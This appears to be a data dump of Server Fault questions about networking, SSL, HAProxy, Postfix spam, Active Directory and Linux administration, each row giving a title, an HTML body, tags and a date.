Looking at bytes, RX is 1/8th of TX.</p>
<p>Is this reasonable?</p>
","<networking><router><interface>","2020-10-29 19:58:03"
"918716","How do I access TCP connection?","<p>I am extremely new with networking and am learning about the TCP Layer; I'm writing software thats going to speak with a tcp server.</p>

<p>I tried googling: <code>tcp schema</code> and <code>tcp protocol</code> but i cannot find how i can communicate with a tcp server.</p>

<p>is it something like <code>tcp://127.0.0.1:8083</code></p>

<p>i apologize if this is extremely easy but like i said im new to networking so i really dont know how i am going to communicate my software with the tcp server.</p>

<p>i tried <code>curl tcp://127.0.0.1:8083</code> but that failed</p>
","<tcp>","2018-06-28 19:26:57"
"918791","How to fix ftps connection refused issue while connecting with filezila","<p>I have configured FTPS in a linux machine but when i am trying to connect through ftps in filezila below error is coming. </p>

<p>Status: Connection attempt failed with ""ECONNREFUSED - Connection refused by server"".
Error:  Could not connect to server</p>
","<linux><ftp><ftps>","2018-06-29 10:11:09"
"971087","node.js app on ubuntu linux with postgresql on virtual box on windows client","<p>I set up, ubuntu linux on virtual box. Then I installed postgresql and node.js 
So basically I made a clean installation and i want that  ubuntu handles my requests. 
When i run <strong>node server.js</strong> , a Sequelize.js error occurred. </p>

<p><strong>Unhandled rejection SequelizeConnetionRefusedError: connect ECONNREFUSED 127.0.0.1:5433</strong></p>

<p>PostgreSQL is listening on port 5432, and once i run node server.js,tables are created with no problem.</p>

<p>I think is a problem with my client, and I don't know why.</p>

<p>postgres.conf <strong>listen_addresses='*'</strong>.</p>

<p>pg_hba.conf  <strong>host all all 0.0.0.0/0 trust</strong>.</p>

<p>I have little bit experience with Linux Ubuntu and configuration
So a big hug and thanks for who will help me</p>
","<ubuntu><postgresql><virtualbox><node.js>","2019-06-12 10:49:00"
"918833","PHP Script is showing error","<p>I am trying to write web services for data exchange between php-mysql server and android device.
But service is showing some errors and not working.</p>

<p>Here is the my code</p>

<pre><code>&lt;?php

     include 'config.inc.php';

     // Check whether username or password is set from android  
     if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))
     {
          // Innitialize Variable
          $result='';
          $username = $_POST['username'];
          $password = $_POST['password'];

          // Query database for row exist or not
          $sql = 'SELECT * FROM tbl_login WHERE  email = :username AND password = :password';
          $stmt = $conn-&gt;prepare($sql);
          $stmt-&gt;bindParam(':username', $username, PDO::PARAM_STR);
          $stmt-&gt;bindParam(':password', $password, PDO::PARAM_STR);
          $stmt-&gt;execute();
          if($stmt-&gt;rowCount())
          {
             $result=""true"";    
          }  
          elseif(!$stmt-&gt;rowCount())
          {
                $result=""false"";
          }

          // send result back to android
          echo $result;
    }

?&gt;
</code></pre>

<p>Right now my colleague who is an android developer is making login session module from android side and he needs web services for registration and login.</p>

<p>Can you solve error? Or</p>

<p>Can you provide some code for these services or link to suitable resource? </p>
","<php><android>","2018-06-29 13:14:03"
"918939","How to configure second wireless router via VLAN trunk?","<p>I am trying to figure how to configure the second wireless router, but I got stuck while trying to get the following configuration:</p>

<ol>
<li>For all VLANs (0-3), the primary router is the DHCP server for IPv4 while the secondary router is the DHCP server for IPv6.</li>
<li>The two routers are connected via a VLAN trunk.</li>
<li>One of the four ports of the secondary router that a server is connected to must be made as a VLAN trunk port.</li>
<li>All access points of the secondary router is bridged to VLAN 1 only.</li>
</ol>

<p>How do I configure the secondary router for the above to work if the primary router is running Tomato while the secondary router is running DD-WRT?</p>
","<networking><vlan><dhcp-server><trunk>","2018-06-30 09:34:48"
"919000","Do I need an SSL certificate at both servers to communicate via TLS 1.2?","<p>If two servers are communicating via TLS 1.2, do <em>both</em> servers need to have an SSL?</p>
","<ssl>","2018-06-30 23:16:45"
"971327","Windows Server 2019 vs Windows Hyper-V Server 2019","<p>I have a server with Windows Server 2019 Standard (with Desktop environment).</p>

<p>I want to transform it in a vps server, so what is the best: my Windows Server + Hyper-V role or Windows Hyper-V Server 2019?</p>
","<windows><hyper-v><windows-server-2019>","2019-06-13 17:46:49"
"971394","How can I access serial port of my GCP instance, It asks password and I never used it","<p>My GCP instance is not booting peoperly, I am trying to connect using serial port 1 and key  but it asks password which I never set.
I enabled it
gcloud compute instances add-metadata teyeprodv1 --metadata serial-port-enable=1
gcloud compute connect-to-serial-port user@instance-name  --ssh-key-file  ~/.ssh/key.pem --zone us-central1-a</p>

<p>Second command ask username and password. I know username but not password.
<a href=""https://i.sstatic.net/tQwl6.png"" rel=""noreferrer"">enter image description here</a></p>
","<google-cloud-platform>","2019-06-14 07:18:57"
"919201","Server Share Unable To Be Accessed On Home PC","<p>I have a VPS that I use for web development.</p>

<p>I have created a server share for C:\inetpub so that I can access the IIS folder without having to connect to the VPS. Meaning I can edit any files directly via a share on my home pc, instead of having to upload any edited files.</p>

<p>However, this has not worked. I have allowed ""any IP"" on all of the required Files &amp; Printing options in advanced firewall, however my home computer cannot connect to \\SERVERIP\inetpub</p>

<p>Any Ideas?</p>
","<windows-server-2012-r2><share>","2018-07-02 15:43:32"
"919211","AWS naming conventions","<p>I'm an experienced programmer but until very recently, I have never worked with AWS. Pretty much every programming language has extensive, fairly standard naming convensions.</p>

<p>What are some best practices on giving names and tagging entities in AWS?</p>
","<amazon-web-services>","2018-07-02 17:09:56"
"919289","Windows 98 routing issue","<p>I have following network setup:</p>

<ul>
<li>Main router connecting to internet, with LAN address 192.168.1.254</li>
<li>Secondary router connected to first router, with LAN address 192.168.2.1</li>
</ul>

<p>I have two PC's connected to secondary router, one with Windows 7, another with Windows 98. Both can access the internet, but on Windows 98 i cannot connect directly to first router for some reason (or any other computer on 192.168.1.0/24 network). On Windows 7 everything works fine. What could be cause of that?</p>

<p>Note: secondary router is OpenWRT-converted access point.</p>
","<nat><openwrt><masquerade>","2018-07-03 09:24:03"
"971606","can't connect to my sql DB server","<p>I'm trying to connect to my sql DB in azure with my primary username and password (I don't have any other username and password) and its failed. I'm 100% sure I entered the right username and password.</p>

<p>is there anything I can do to connect my DB?</p>

<p>thanks for the help!</p>
","<azure><azure-sql>","2019-06-16 01:27:28"
"919430","Is it correct to see certificate from another domain in case of missing cert?","<p>I have 3 sites defined in apache, site1, site2, site3
For 1 and 2 I requested ssl certs from Let's encrypt and work OK, but NOT for site 3.
Problem is that whenever I access <a href=""https://site3"" rel=""nofollow noreferrer"">https://site3</a> I always get a certificate from one of the other sites, I think from the first one defined. </p>

<p>Is this how apache should work or my config is wrong ? Not sure what I should see when I have no cert defined, maybe some ""no cert"" error ?!</p>

<p><strong>/etc/httpd/conf/httpd.conf</strong></p>

<pre><code># http site 1
&lt;VirtualHost site1.com:80&gt;
        DocumentRoot /var/www/html/site1.com
        ServerName site1.com
        &lt;Directory ""/var/www/html/site1.com""&gt;
                Require all granted
                DirectoryIndex index.html index.php
        &lt;/Directory&gt;
&lt;/VirtualHost&gt;


# http site 2
&lt;VirtualHost site2.com:80&gt;
        DocumentRoot /var/www/html/site2.com
        ServerName site2.com
        &lt;Directory ""/var/www/html/site2.com""&gt;
                Require all granted
                DirectoryIndex index.html index.php
        &lt;/Directory&gt;
&lt;/VirtualHost&gt;

# http site 3 (only one WITHOUT ANY SSL)
&lt;VirtualHost site3.com:80&gt;
        DocumentRoot /var/www/html/site3.com
        ServerName site3.com
        &lt;Directory ""/var/www/html/site3.com""&gt;
                Require all granted
                DirectoryIndex index.html index.php
        &lt;/Directory&gt;
&lt;/VirtualHost&gt;

Include /etc/httpd/conf/httpd-le-ssl.conf &gt;&gt;&gt;&gt;&gt;&gt;&gt;
</code></pre>

<p><strong>/etc/httpd/conf/httpd-le-ssl.conf</strong></p>

<pre><code># SSL site 1
&lt;IfModule mod_ssl.c&gt;
&lt;VirtualHost site1.com:443&gt;
        DocumentRoot /var/www/html/site1.com
        ServerName site1.com
        &lt;Directory ""/var/www/html/site1.com""&gt;
                Require all granted
                DirectoryIndex index.html index.php
        &lt;/Directory&gt;

Include /etc/letsencrypt/options-ssl-apache.conf
SSLCertificateFile /etc/letsencrypt/live/www.site1.com/cert.pem
SSLCertificateKeyFile /etc/letsencrypt/live/www.site1.com/privkey.pem
SSLCertificateChainFile /etc/letsencrypt/live/www.site1.com/chain.pem
&lt;/VirtualHost&gt;
&lt;/IfModule&gt;

# SSL site 2
&lt;IfModule mod_ssl.c&gt;
&lt;VirtualHost site2.com:443&gt;
        DocumentRoot /var/www/html/site2.com
        ServerName site2.com
        &lt;Directory ""/var/www/html/site2.com""&gt;
                Require all granted
                DirectoryIndex index.html index.php
        &lt;/Directory&gt;

Include /etc/letsencrypt/options-ssl-apache.conf
SSLCertificateFile /etc/letsencrypt/live/www.site2.com/cert.pem
SSLCertificateKeyFile /etc/letsencrypt/live/www.site2.com/privkey.pem
SSLCertificateChainFile /etc/letsencrypt/live/www.site2.com/chain.pem
&lt;/VirtualHost&gt;
&lt;/IfModule&gt;
</code></pre>
","<ssl><apache-2.4><ssl-certificate><lets-encrypt><ssl-certificate-errors>","2018-07-04 09:21:31"
"971672","Heartbeat node that was kicked out doesn't rejoin virtual IP service","<p>We have a 2-node heartbeat cluster that servers a virtual IP. Previous due to an error, the network interface for node1 died and resulted in the cluster kicking node1 from the virtual IP party. </p>

<p>Now that we have fixed it, node1 no longer gets to rejoin the virtual IP party. Setting node2 to standby does not trigger failover to node1. </p>

<p>I am unfamiliar with heartbeat. Is there a configuration/command anywhere that allows me to reverse/configure/un-blacklist this?</p>
","<cluster><heartbeat><virtual-ip>","2019-06-17 03:47:34"
"844074","Debian add all available IPv6 addresses","<p>I know it's possible to add singe IPv6 addresses to the system by calling this command:</p>

<pre><code>ip -6 addr add 2002:c000:203::1/64 dev eth0
</code></pre>

<p>This works fine for single addresses. However if I want several of these I have to add them all manually. So my question is if there's a way to allow my system to bind/respond to all possible IPv6 addresses without having to manually enable them.<br>
And if so how can I add this configuration in the <code>/etc/interfaces</code> file so that this configuration persists over a reboot of the system?</p>
","<debian><ip><ipv6>","2017-04-12 08:41:51"
"1041495","Make mpc command on linux outout only number of progress for the song?","<p>While a song is playing through mpd; When i type this command:</p>
<pre><code>mpc | sed 's/.*(//;s/)//;2q;d
</code></pre>
<p>I get the progress percentage; How can i remove the percentage symbol as well and only keep the numbers?</p>
","<linux>","2020-11-06 07:25:29"
"844150","Cat6 utp cable installation at home","<p>I'm going to install cat6 utp cable in my house but, i want it in the same place where my electrical cable is installed (120 volts). </p>

<p>I was reading in other sites but some of them says that is recommended to separate both cables (ethernet and electrical). It is true or false??</p>

<p>Hope you can help me.</p>

<p>Regards</p>
","<networking><router><linksys>","2017-04-12 15:36:06"
"1041555","Do NTP servers log ip addresses","<p>There are many NTP servers like time.google.com time.cloudfare.com and so on . Do these services log ip addresses of the visitors?Have heard that http servers do log ip addresses and though not related to this qestion , removal of ip address is required by GDPR.</p>
","<ntp>","2020-11-06 16:01:21"
"844184","My site send spam automatically","<p>When I run the command <strong>mailq</strong> on my site a get an output like this:</p>

<pre><code>B8D90603E86F4     3422 Wed Apr 12 14:04:14  info@tk-atlant.ru
(host alt1.gmail-smtp-in.l.google.com[209.85.202.26] said: 421-4.7.0 [vvv.xxx.yyy.zzz       4] Our system has detected an unusual rate of 421-4.7.0 unsolicited mail originating from your IP address. To protect our 421-4.7.0 users from spam, mail sent from your IP address has been temporarily 421-4.7.0 rate limited. Please visit 421-4.7.0  https://support.google.com/mail/?p=UnsolicitedRateLimitError to 421 4.7.0 review our Bulk Email Senders Guidelines. g3si9112268wmc.148 - gsmtp (in reply to end of DATA command))
                                         brushalinder03@gmail.com
                                         brushdude@gmail.com
                                         brushesc@gmail.com
                                         brushfreeman@gmail.com
                                         brushing001@gmail.com
                                         brushing1289@gmail.com
                                         brushing222@gmail.com
                                         brushing2@gmail.com
                                         brushmark444@gmail.com
                                         brusholf@gmail.com
                                         brushpenart@gmail.com
                                         brushroom@gmail.com
                                         brushton34@gmail.com
                                         brushton51089@gmail.com
                                         brushton@gmail.com
                                         brushwerx@gmail.com
                                         brushyhollowtrails@gmail.com
                                         brusine@gmail.com
                                         bruska13@gmail.com
                                         bruskbog@gmail.com
                                         bruski27@gmail.com
                                         bruskidickens@gmail.com
                                         brusnac@gmail.com
                                         brusnak@gmail.com
                                         brusojessie@gmail.com
                                         brusse1.62@gmail.com
                                         brusseau44@gmail.com
                                         brussell.russell52@gmail.com
                                         brussell104@gmail.com
                                         brussell1167@gmail.com
                                         brussell22@gmail.com
                                         brussell2326@gmail.com
                                         brussell495@gmail.com
                                         brussell588@gmail.com
                                         brussell719@gmail.com
                                         brussell8899@gmail.com
                                         brussell8998@gmail.com
                                         brussell@gmail.com
                                         brussellsacks@gmail.com
                                         brussellv@gmail.com
                                         brussina@gmail.com
                                         brusso13@gmail.com
                                         brusso2892@gmail.com
                                         brusso530@gmail.com
                                         brusson@gmail.com
                                         brust411@gmail.com
                                         brustbaby6986@gmail.com
                                         brustflorida1989@gmail.com
                                         brusther1@gmail.com
                                         brustin29@gmail.com

4E8F2603E86EB     6067 Wed Apr 12 14:04:13  MAILER-DAEMON
(host mx.yandex.net[213.180.193.89] said: 451 4.7.1 Sorry, the service is currently unavailable. Please come back later. 1492020260-fQSwdIJrgP-4KMuQhZW (in reply to end of DATA command))
                                         info@tk-atlant.ru
</code></pre>

<p>where vvv.xxx.yyy.zzz is my ip address</p>

<p>When I search for spam on the mail.log I've got this</p>

<pre><code>Apr 12 14:13:44 mail postfix/smtp[30705]: 1ADDD603E8E77: host gmail-smtp-in.l.google.com[108.177.11.27] said: 421-4.7.0 [190.202.87.1       4] Our system has detected an unusual rate of 421-4.7.0 unsolicited mail originating from your IP address. To protect our 421-4.7.0 users from spam, mail sent from your IP address has been temporarily 421-4.7.0 rate limited. Please visit 421-4.7.0  https://support.google.com/mail/?p=UnsolicitedRateLimitError to 421 4.7.0 review our Bulk Email Senders Guidelines. q34si10070519uaq.158 - gsmtp (in reply to end of DATA command)
Apr 12 14:13:44 mail postfix/smtp[30699]: 2EAB4603E86FC: host gmail-smtp-in.l.google.com[108.177.11.27] said: 421-4.7.0 [190.202.87.1       4] Our system has detected an unusual rate of 421-4.7.0 unsolicited mail originating from your IP address. To protect our 421-4.7.0 users from spam, mail sent from your IP address has been temporarily 421-4.7.0 rate limited. Please visit 421-4.7.0  https://support.google.com/mail/?p=UnsolicitedRateLimitError to 421 4.7.0 review our Bulk Email Senders Guidelines. f7si1701964uaf.125 - gsmtp (in reply to end of DATA command)
Apr 12 14:13:45 mail postfix/smtp[30701]: 1F131603E8E50: host gmail-smtp-in.l.google.com[108.177.11.27] said: 421-4.7.0 [190.202.87.1       4] Our system has detected an unusual rate of 421-4.7.0 unsolicited mail originating from your IP address. To protect our 421-4.7.0 users from spam, mail sent from your IP address has been temporarily 421-4.7.0 rate limited. Please visit 421-4.7.0  https://support.google.com/mail/?p=UnsolicitedRateLimitError to 421 4.7.0 review our Bulk Email Senders Guidelines. g126si7977133vkg.204 - gsmtp (in reply to end of DATA command)
Apr 12 14:13:45 mail postfix/smtp[30691]: 1BD69603E8D97: host gmail-smtp-in.l.google.com[108.177.11.27] said: 421-4.7.0 [190.202.87.1       4] Our system has detected an unusual rate of 421-4.7.0 unsolicited mail originating from your IP address. To protect our 421-4.7.0 users from spam, mail sent from your IP address has been temporarily 421-4.7.0 rate limited. Please visit 421-4.7.0  https://support.google.com/mail/?p=UnsolicitedRateLimitError to 421 4.7.0 review our Bulk Email Senders Guidelines. v5si2114982uaf.147 - gsmtp (in reply to end of DATA command)
Apr 12 14:13:45 mail postfix/smtp[30681]: 23144603E8AA0: host gmail-smtp-in.l.google.com[108.177.11.27] said: 421-4.7.0 [190.202.87.1       4] Our system has detected an unusual rate of 421-4.7.0 unsolicited mail originating from your IP address. To protect our 421-4.7.0 users from spam, mail sent from your IP address has been temporarily 421-4.7.0 rate limited. Please visit 421-4.7.0  https://support.google.com/mail/?p=UnsolicitedRateLimitError to 421 4.7.0 review our Bulk Email Senders Guidelines. g72si7067092vki.93 - gsmtp (in reply to end of DATA command)
Apr 12 14:13:45 mail postfix/smtp[30678]: 2F334603E8A90: host gmail-smtp-in.l.google.com[108.177.11.27] said: 421-4.7.0 [190.202.87.1       4] Our system has detected an unusual rate of 421-4.7.0 unsolicited mail originating from your IP address. To protect our 421-4.7.0 users from spam, mail sent from your IP address has been temporarily 421-4.7.0 rate limited. Please visit 421-4.7.0  https://support.google.com/mail/?p=UnsolicitedRateLimitError to 421 4.7.0 review our Bulk Email Senders Guidelines. w66si10076884vke.101 - gsmtp (in reply to end of DATA command)
Apr 12 14:13:47 mail postfix/smtp[30686]: 299DA603E8DA5: host gmail-smtp-in.l.google.com[108.177.11.27] said: 421-4.7.0 [190.202.87.1       4] Our system has detected an unusual rate of 421-4.7.0 unsolicited mail originating from your IP address. To protect our 421-4.7.0 users from spam, mail sent from your IP address has been temporarily 421-4.7.0 rate limited. Please visit 421-4.7.0  https://support.google.com/mail/?p=UnsolicitedRateLimitError to 421 4.7.0 review our Bulk Email Senders Guidelines. c187si10068708vkd.194 - gsmtp (in reply to end of DATA command)
Apr 12 14:13:47 mail postfix/smtp[30700]: 22329603E8E45: host gmail-smtp-in.l.google.com[108.177.11.27] said: 421-4.7.0 [190.202.87.1       4] Our system has detected an unusual rate of 421-4.7.0 unsolicited mail originating from your IP address. To protect our 421-4.7.0 users from spam, mail sent from your IP address has been temporarily 421-4.7.0 rate limited. Please visit 421-4.7.0  https://support.google.com/mail/?p=UnsolicitedRateLimitError to 421 4.7.0 review our Bulk Email Senders Guidelines. k20si7240125uaf.60 - gsmtp (in reply to end of DATA command)
Apr 12 14:13:48 mail postfix/smtp[30710]: 27917603E8DAB: host gmail-smtp-in.l.google.com[108.177.11.27] said: 421-4.7.0 [190.202.87.1       4] Our system has detected an unusual rate of 421-4.7.0 unsolicited mail originating from your IP address. To protect our 421-4.7.0 users from spam, mail sent from your IP address has been temporarily 421-4.7.0 rate limited. Please visit 421-4.7.0  https://support.google.com/mail/?p=UnsolicitedRateLimitError to 421 4.7.0 review our Bulk Email Senders Guidelines. x38si10023076uax.138 - gsmtp (in reply to end of DATA command)
Apr 12 14:13:49 mail postfix/smtp[30709]: 2E36E603E8DA7: host gmail-smtp-in.l.google.com[108.177.11.27] said: 421-4.7.0 [190.202.87.1       4] Our system has detected an unusual rate of 421-4.7.0 unsolicited mail originating from your IP address. To protect our 421-4.7.0 users from spam, mail sent from your IP address has been temporarily 421-4.7.0 rate limited. Please visit 421-4.7.0  https://support.google.com/mail/?p=UnsolicitedRateLimitError to 421 4.7.0 review our Bulk Email Senders Guidelines. k129si10052482vkf.49 - gsmtp (in reply to end of DATA command)
</code></pre>

<p>Pleasse any suggestion to stop this</p>
","<email><spam>","2017-04-12 18:17:49"
"919846","Migrating from Windows 2008 Domain Controller to another DC and retiring former","<p>I don't have any proper training in Active Directory (rather I just fumble around and manage this network part time relying on experts in places such as this site), so I apologize in advance if these are really fundamentally silly questions. In other words, treat me like I'm 5. :)</p>

<p>Situation:</p>

<p>I want to migrate away from a DC (DC1) because its old hardware and likely to fail on me to DC2.</p>

<p>In my domain I have:</p>

<p>-DC1: Win 2008R2, Active Directory domain Services role, DNS Role. Global Catalog and all 5 FSMO roles. Not a VM, its a hard box. DC1 has been the first DC in our domain for many years.</p>

<p>-DC2: Win 2008R2, Active Directory domain Services role, DNS Role. Global Catalog. This is a VM on newer hardware. I promoted this VM to DC a few months ago when another DC2 had a full hardware failure.</p>

<p>Proposed actions:</p>

<p>What I think I need to do is: </p>

<p>""Transfer"" the FSMO roles from DC1 to DC2: <a href=""https://support.microsoft.com/en-us/help/255504/using-ntdsutil-exe-to-transfer-or-seize-fsmo-roles-to-a-domain-control"" rel=""nofollow noreferrer"">https://support.microsoft.com/en-us/help/255504/using-ntdsutil-exe-to-transfer-or-seize-fsmo-roles-to-a-domain-control</a> or <a href=""https://www.petri.com/transferring_fsmo_roles"" rel=""nofollow noreferrer"">https://www.petri.com/transferring_fsmo_roles</a></p>

<p>Upon success, spin up a new DC #3 (a VM on different HW than DC2), promote it as a another DC alongside the current DCs. Assign Global Catalog and DNS to this new DC3.</p>

<p>Upon success demote DC1 and decommission the hardware, wipe the drive, etc..</p>

<p>Are there any steps I am missing or anything else I should consider? I think the transfer is straightforward (I have also seized roles in the past when another DC failed outright) but I feel like I am missing some steps here. I'm also not onsite but doing this remotely so I don't want to make any mistakes and make for a long day talking marketing guys through commands.</p>

<p>Thanks.</p>
","<active-directory><windows-server-2008-r2>","2018-07-06 20:20:24"
"919871","What are the best nginx modules for a high productive web site?","<p>I am going to reinstall nginx on a fresh Ubuntu 16 server. E5 with 132 GB of ram. I looked at a script called compile-nginx-from-source.sh over at githubgist by user nmrony. Looks great and made for Ubuntu 16. What are your thoughts on some of the most necessary nginx modules to install?</p>
","<ubuntu><nginx><source>","2018-07-06 22:49:26"
"919900","Could not resolve host after removing KDE packages","<p>When the server was deployed, KDE was installed, it was not needed and I removed it. </p>

<p>Now when executing queries with any utilities (including apt) I get Could not resolve host.</p>

<p>What could I delete by mistake and how to make it work?</p>

<p>My server is Debian 9.2 (stretch) </p>
","<linux><networking><debian><https><http>","2018-07-07 07:31:26"
"919908","Resize (enlarge) filesystem to partition size","<p>I've got an 16GB SD card with Raspbian on it.</p>

<pre><code>$ lsb_release -a
No LSB modules are available.
Distributor ID: Raspbian
Description:    Raspbian GNU/Linux 8.0 (jessie)
Release:    8.0
Codename:   jessie
</code></pre>

<p>There are (as usual) two partitions on the device. The boot partition and the root partition. The root partition uses almost all the space.</p>

<pre><code>$ sudo fdisk -l /dev/mmcblk0 

Disk /dev/mmcblk0: 14.6 GiB, 15640559616 bytes, 30547968 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x4ae87cfb

Device         Boot  Start      End  Sectors  Size Id Type
/dev/mmcblk0p1      204800   729087   524288  256M  c W95 FAT32 (LBA)
/dev/mmcblk0p2      729088 30547967 29818880 14.2G 83 Linux
</code></pre>

<p>But the filesystem only uses something around 7GB of this partition:</p>

<pre><code>$ df -T /
Filesystem     Type 1K-blocks    Used Available Use% Mounted on
/dev/root      ext4   7155064 5881840    893372  87% /
$  df -Th /   
Filesystem     Type  Size  Used Avail Use% Mounted on
/dev/root      ext4  6.9G  5.7G  873M  87% /
</code></pre>

<h2>The Problem</h2>

<p>For some reason resize2fs denies to resize the filesystem on-line to the partitions size:</p>

<pre><code>$ sudo resize2fs /dev/mmcblk0p2 
resize2fs 1.43.3 (04-Sep-2016)
Filesystem at /dev/mmcblk0p2 is mounted on /; on-line resizing required
old_desc_blocks = 1, new_desc_blocks = 1
resize2fs: Permission denied to resize filesystem
</code></pre>

<p>Any ideas, what the reason could be?</p>
","<filesystems><ext4>","2018-07-07 10:46:29"
"919914","HaProxy using IIS on same port with different host headers","<p>I'm running version <code>HA-Proxy version 1.8.12-1ppa1~bionic 2018/06/27</code> on Ubuntu.</p>

<p>I'm trying to load balance requests to load.mysite.com to two different windows servers with IIS. The servers also have other website running on IIS with the same ports. We use host name binding to arrive on the correct website.</p>

<p>This is my HAProxy cfg:</p>

<pre><code>global
        log /dev/log    local0
        log /dev/log    local1 notice
        chroot /var/lib/haproxy
        stats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners
        stats timeout 30s
        user haproxy
        group haproxy
        daemon

        # Default SSL material locations
        ca-base /etc/ssl/certs
        crt-base /etc/ssl/private

        # Default ciphers to use on SSL-enabled listening sockets.
        ssl-default-bind-ciphers ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:RSA+AESGCM:RSA+AES:!aNULL:!MD5:!DSS
        ssl-default-bind-options no-sslv3

defaults
        log     global
        mode    http
        option  httplog
        option  dontlognull
        option forwardfor
        timeout connect 5000
        timeout client  50000
        timeout server  50000
        errorfile 400 /etc/haproxy/errors/400.http
        errorfile 403 /etc/haproxy/errors/403.http
        errorfile 408 /etc/haproxy/errors/408.http
        errorfile 500 /etc/haproxy/errors/500.http
        errorfile 502 /etc/haproxy/errors/502.http
        errorfile 503 /etc/haproxy/errors/503.http
        errorfile 504 /etc/haproxy/errors/504.http

# Stats
listen stats
        bind *:9999
        stats enable
        stats hide-version
        stats uri /stats
        stats auth admin:***

# Http In - forward to https
frontend http-in
        bind *:80
        redirect scheme https if !{ ssl_fc }

# Https in
frontend https-in
        bind *:443 ssl crt /etc/ssl/mysite.com/mysite.com.pem
        acl host_mysitePlatform hdr(host) -i load.mysite.com
        use_backend mysitePlatform_cluster if host_mysitePlatform

backend mysitePlatform_cluster
        balance roundrobin
        http-request set-header Host node1.mysite.com if { srv_id 1 }
        http-request set-header Host node2.mysite.com if { srv_id 2 }
#       http-send-name-header Host
        server mysite1Server node1.mysite.com:443 check ssl verify none
        server mySite2Server node2.mysite.com:443 check ssl verify none
</code></pre>

<p>This configuration is not working. IIS returns a 404 because it does not know to which site it should bind.</p>

<p>It works for backend server <code>node1.mysite.com</code> when I remove <code>if { srv_id 1 }</code>.
But then of course it only works for one server.</p>

<p>So it looks like the condition <code>if { srv_id ? }</code> is always false.</p>

<p>I could just fix it by using the same host name bindings on both IIS servers (e.g. www.mysite.com) but we have some constraints that prevent us from doing that.</p>

<p>Also, initially we want the backends to be https because we need code changes to disable https and we want to do those after go live of the load balancer. In a later stage all our backends will be on port 80.</p>

<p>I commented <code>http-send-name-header Host</code> because this also didn't work. Only <code>http-request set-header Host &lt;hostName&gt;</code> works for me.</p>

<p>So my question is, how do I get <code>srv_id</code> to work? I also tried with creating an acl first that for example checks if srv_id = 1 but that is also always false. Perhaps if I could log the actual value of <code>srv_id</code> when load balancing to a server, then I could change my if statement to the correct value.</p>
","<iis><haproxy>","2018-07-07 12:58:06"
"919968","If I'm using Netlify DNS servers, is there a way I can get emails to forward to a Gmail address? (for a host on Google domains)","<p>I'm trying to use Netlify (<a href=""https://www.netlify.com/"" rel=""nofollow noreferrer"">https://www.netlify.com/</a>) for deployment to a custom domain which has worked. But in order to do that, I've switched from Google's DNS servers (the domain is registered on Google Domains) to using Netlify's DNS. </p>

<p>In theory it seems like I can change the MX records at <code>https://app.netlify.com/account/dns/&lt;domain&gt;</code> — but what can I change them to if I don't have a host? I know I can buy Google Apps for my domain, but I don't actually want anything from it except forwarding so it seems like overkill. </p>

<p>All I want is forwarding of specific emails to a gmail address for now (though I'd be open to just forwarding all emails to the domain if need be).</p>
","<domain-name-system><email><email-server><mx-record>","2018-07-08 01:50:34"
"920014","Windows Server 2016 licensing in a remote desktop scenario","<p>I want to use a Windows Server 2016 instance as a Hyper-V host. This server should provide several Windows 10 VMs to users which connect via RDP onto the machines.
Is this only possible with a RDS role configured on the server? And do I need a CAL for each connecting user (or respectively device) to be correctly licensed?
Thank your for your answer.</p>
","<rdp><windows-server-2016><licensing><vdi>","2018-07-08 17:19:33"
"844378","How to change the local delivery of accounts?","<p>I have noticed in my logs that Postfix cannot send emails to local accounts. </p>

<pre><code>postfix/local[12775]: warning: maildir access problem for UID/GID=33/33: create maildir file /var/www/Maildir/tmp/1492097290.P12775.FQDN: Permission denied
postfix/local[12775]: warning: perhaps you need to create the maildirs in advance
postfix/local[12775]: 56ABC81A28: to=&lt;www-data@FQDN&gt;, relay=local, delay=0.02, delays=0/0.01/0/0.01, dsn=5.2.0, status=bounced (maildir delivery failed: create maildir file /var/www/Maildir/tmp/1492097290.P12775.FQDN: Permission denied)
postfix/qmgr[8037]: 56ABC81A28: removed
</code></pre>

<p>I have virtual domains configured, and they work correctly. I am able to successfully send emails from one account to another. </p>

<p>How to change the local delivery options of Postfix to another directory other than the <code>/var/www/</code>? </p>
","<postfix><dovecot><debian-jessie>","2017-04-13 15:53:17"
"920101","migration HP-UX to Hyper-V","<p>I would like to ask about possibility to migrate  phisically server (HP RP3440) with installed HP-UX v11.1 to Hyper-V/VirtualBox/VMware.</p>

<p>Thanks for Your effort to explain me how to do it.</p>
","<virtualization><hyper-v><hp-ux>","2018-07-09 12:09:16"
"844431","How to avoid updates to ALL rows in Mysql table?","<p>Is there a way by which update to ALL rows of a Mysql table could be denied or avoided?</p>

<p>Background:</p>

<p>I have a table 'Orders' having 'OrderID' (Type VARCHAR) and 'VendorID' (Type Integer) as two of the columns. If I run the below query on this table, it simply  resets VendorID in all the rows:</p>

<pre><code>SET `VendorID` = 0 WHERE `OrderID` = 0
</code></pre>

<p>OrderID should not be 0 but because of some bug in the system, it escaped all the checks and created havoc. Had OrderID been of Integer type, this query would not have done anything. But since OrderID has alphabets, it could not be set as Integer type.</p>

<p>Can Mysql be configured in such a way that it rejects Updates to all rows? Would result of this query change if underlying database is not Mysql?</p>

<p>My environment:</p>

<p>nginx/1.4.6
Codeigniter (2.x) / Mysql (5.5) / InnoDB table type</p>

<p>Please suggest how this issue could be avoided in future, thanks.</p>
","<mysql><innodb>","2017-04-13 19:42:38"
"844447","What are the benefits of enabling Enhanced Networking for EC2?","<p>EC2 seems to provide a mechanism to enable Enhanced Networking for certain EC2 instance types. However, the use cases and benefits are not clearly spelled out?</p>

<p>What are they and when is it appropriate to use?</p>
","<amazon-ec2><linux-networking><kernel-modules>","2017-04-13 20:58:53"
"920155","proper configuration of /etc/network/interfaces for WOL, dhcp, bind, tftpboot, nfs servers","<p>This is my configuration of network interfaces, but i will its buggy. Could You show me which things of it should i avoid and how to correct them?</p>

<p>source /etc/network/interfaces.d/*</p>

<pre><code># The loopback network interface
auto lo
iface lo inet loopback


#external eth0 we get connection to sky from normal router here
auto enp0s10
iface enp0s10 inet static
        address 192.168.1.106
        gateway 192.168.1.1
        mtu 1500 #rise size of packet
        metric 100 #smaller priority for route -n, probably something else i forgot
        dns-nameservers 10.10.1.1
        up ethtool -s enp0s10 wol g #wake on lan
